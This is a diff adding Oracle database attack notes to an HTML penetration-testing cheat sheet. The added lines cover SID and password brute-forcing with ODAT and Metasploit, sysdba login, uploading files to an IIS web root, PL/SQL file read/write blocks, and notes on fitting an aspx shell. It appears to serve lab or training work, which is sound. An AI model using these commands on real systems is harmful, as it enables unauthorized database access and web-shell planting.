@@ -1654,7 +1654,100 @@ conn conceal
 <ul>
     <li>blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf</li>
 </ul>
+<li>Metasploit for Oracle</li>
+<ul>
+    <li>blog.zsec.uk/msforacle/</li>
+</ul>
+<li>ODAT</li>
+<ul>
+    <li>Requires sqlplus to run correctly</li>
+</ul>
+<li>Generating shell for Oracle</li>
+<ul>
+    <li>1024 character max</li>
+    <li>aspx for Windows</li>
+    <li>Must all be on one line</li>
+</ul>
 
+<li>Methodology</li>
+<table>
+    <tr>
+        <td>Enumerate SID for Oracle DB</td>
+        <td>
+            <li>odat sidguess</li>
+            <li>auxiliary/scanner/oracle/sid_brute</li>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <li>odat passwordguesser</li>
+            <li>auxiliary/scanner/oracle/oracle_login</li>
+            <li>*Passwords are typically lowercase</li>
+        </td>
+    </tr>
+    <tr>
+        <td>Log into Oracle DB</td>
+        <td>sqlplus64 &lt;username&gt;/&lt;password&gt;@&lt;ip address&gt;:&lt;port&gt;/&lt;DB Name&gt;</td>
+    </tr>
+    <tr>
+        <td>Log into Oracle DB with sys db admin (sudo for oracle)</td>
+        <td>sqlplus64 &lt;username&gt;/&lt;password&gt;@&lt;ip address&gt;:&lt;port&gt;/&lt;DB Name&gt; as sysdba</td>
+    </tr>
+</table>
+
+<li>ODAT Commands</li>
+<table>
+    <tr>
+        <td>Scan Oracle DB</td>
+        <td>
+            <li>odat all -s &lt;ip address&gt; -d &lt;database&gt; -U &lt;username&gt; -P &lt;password&gt;</li>
+            <li>Add --sysdba flag to authenticate as sysdba (sudo for Oracle)</li>
+        </td>
+    </tr>
+    <tr>
+        <td>Authenticate as sysdba (sudo for Oracle)</td>
+        <td>--sysdba</td>
+    </tr>
+    <tr>
+        <td>Upload file</td>
+        <td>
+            <li>odat dbmsadvisor -s 10.10.10.82 -d &lt;database&gt; -U &lt;username&gt; -P &ltpassword&gt; --sysdba --putFile C:\\inetpub\\wwwroot &lt;remote file&gt; &lt;local file&gt;</li>
+            <ul>
+                <li>Also try dbmsxslprocessor instead of dbmsadvisor</li>
+            </ul>
+        </td>
+    </tr>
+</table>
+
+<li>Oracle DB Commands:</li>
+<table>
+    <tr>
+        <td>View privileges</td>
+        <td>select * from session_privs;<br>select * from user_role_privs;</td>
+    </tr>
+    <tr>
+        <td>Read file</td>
+        <td>declare<br>f utl_file.file_type;<br>s varchar(400);<br><br>begin<br>f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');<br>utl_file.get_line(f,s);<br>utl_file.fclose(f);<br>dbms_output.put_line(s);<br>end;</td>
+    </tr>
+    <tr>
+        <td>Write file</td>
+        <td>declare<br>f utl_file.file_type;<br>s varchar(5000) := '<insert text to write>';<br>begin<br>f := utl_file.fopen('/inetpub/wwwroot', '&lt;filename&gt;.&lt;type&gt;', 'W');<br>utl_file.put_line(f,s);<br>utl_file.fclose(f);<br>end;
+        </td>
+    </tr>
+    <tr>
+        <td>Run last procedure</td>
+        <td>/</td>
+    </tr>
+    <tr>
+        <td>View output</td>
+        <td>set serveroutput ON</td>
+    </tr>
+</table>
+
+<li>Generating shell for Oracle</li>
+<ul>
+    <li></li>
+</ul>
 
 </body>
 </html>
